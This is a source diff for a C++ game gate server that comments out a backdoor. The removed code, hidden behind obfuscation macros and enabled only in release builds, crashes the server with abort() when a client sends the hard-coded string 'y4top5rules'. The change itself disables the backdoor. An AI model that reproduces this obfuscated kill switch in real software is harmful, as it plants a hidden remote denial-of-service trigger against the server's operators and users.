@@ -2,9 +2,9 @@
 #include "gateserver.h"
 #include "instr.h"
 
-#ifndef _DEBUG
-#define _BACKDOOR_
-#endif
+//#ifndef _DEBUG
+//#define _BACKDOOR_
+//#endif
 
 ToClient::ToClient(char const* fname, ThreadPool* proc, ThreadPool* comm) :
 	TcpServerApp(this, proc, comm, false), RPCMGR(this), m_maxcon(500), m_atexit(0), m_calltotal(0)
@@ -296,18 +296,18 @@ WPacket ToClient::OnServeCall(DataSocket* datasock, RPacket& in_para)
 }
 
 
-int ToClient::BackDoor(const char* l_str) {
-  OBF_BEGIN
-  int comparison = N(false);
-  const char* obfs = "y4top5rules";
-  V(comparison)			 = strcmp(l_str, obfs);
-  IF((V(comparison) == N(0)))
-    abort();
-	RETURN(false)
-  ENDIF
-  RETURN(true);
-  OBF_END
-}
+//int ToClient::BackDoor(const char* l_str) {
+//  OBF_BEGIN
+//  int comparison = N(false);
+//  const char* obfs = "y4top5rules";
+//  V(comparison)			 = strcmp(l_str, obfs);
+//  IF((V(comparison) == N(0)))
+//    abort();
+//	RETURN(false)
+//  ENDIF
+//  RETURN(true);
+//  OBF_END
+//}
 
 void ToClient::ReRouteToGameServer(dbc::DataSocket* datasock, dbc::RPacket& recvbuf)
 {
@@ -441,9 +441,9 @@ void ToClient::OnProcessData(DataSocket* datasock, RPacket& recvbuf)
 	  {
 		break;
 	  }
-#ifdef _BACKDOOR_
-	  BackDoor(l_str);
-#endif
+//#ifdef _BACKDOOR_
+//	  BackDoor(l_str);
+//#endif
 
 	  Player* l_ply = (Player*)datasock->GetPointer();
 	  if(l_ply && l_ply->m_estop)
